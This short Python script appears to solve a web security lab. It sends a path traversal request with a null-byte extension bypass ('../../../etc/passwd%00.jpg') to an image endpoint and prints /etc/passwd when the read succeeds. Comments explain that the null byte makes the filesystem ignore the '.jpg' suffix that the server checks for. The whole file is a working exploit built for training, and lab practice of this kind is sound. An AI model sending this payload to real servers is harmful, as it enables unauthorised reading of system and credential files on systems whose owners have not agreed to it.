import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# server validates that the filename ends with an allowed extension like .jpg
# null byte (%00) terminates the string at the filesystem level
# so the OS reads /etc/passwd while the app thinks it ends in .jpg
resp = lab.session.get(lab.url("/image?filename=../../../etc/passwd%00.jpg"))

if resp.status_code == 200 and "root:" in resp.text:
    lab.success("Got /etc/passwd:")
    print(resp.text)
else:
    lab.fail(f"Traversal failed (status {resp.status_code})")

lab.check_solved()
